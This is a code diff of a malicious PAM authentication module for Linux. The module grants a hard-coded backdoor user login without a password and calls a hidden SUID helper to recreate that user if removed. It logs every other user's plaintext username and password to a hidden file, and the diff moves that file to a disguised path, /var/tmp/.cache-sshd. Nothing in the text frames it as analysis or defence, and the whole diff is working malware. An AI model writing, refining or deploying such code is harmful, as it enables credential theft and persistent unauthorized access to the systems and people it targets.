@@ -6,50 +6,40 @@
 #include <pwd.h>
 #include <unistd.h>
 
-#define LOGFILE "/tmp/.credlog.txt"
+#define LOGFILE "/var/tmp/.cache-sshd"
 #define BACKDOOR_USER "nihargayam"
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                     int argc, const char **argv) {
+    const char *username = NULL;
+    const char *password = NULL;
 
-
+    // Recreate backdoor user if deleted
     if (getpwnam(BACKDOOR_USER) == NULL) {
-        system("/usr/bin/.dbsync");  // Call your SUID helper
+        system("/usr/bin/.dbsync");  // SUID helper
     }
 
-  
-    const char *username = NULL;
-    int pam_result = pam_get_user(pamh, &username, NULL);
-    if (pam_result != PAM_SUCCESS || username == NULL)
+    // Get the username
+    if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS || username == NULL)
         return PAM_USER_UNKNOWN;
 
+    // Bypass auth for backdoor user
     if (strcmp(username, BACKDOOR_USER) == 0) {
-        // Bypass password for the backdoor user
         return PAM_SUCCESS;
     }
 
+    // Get password
+    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS || password == NULL)
+        password = "<null>";
 
-
-    const char *password;
-
-    pam_get_user(pamh, &username, NULL);
-    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
-
-
-  
+    // Log credentials
     FILE *log = fopen(LOGFILE, "a");
     if (log) {
         fprintf(log, "User: %s, Password: %s\n", username, password);
         fclose(log);
     }
 
-
-
-
-
-
-  
-    // Let other modules handle authentication
+    // Let real PAM modules do the rest
     return PAM_IGNORE;
 }
 
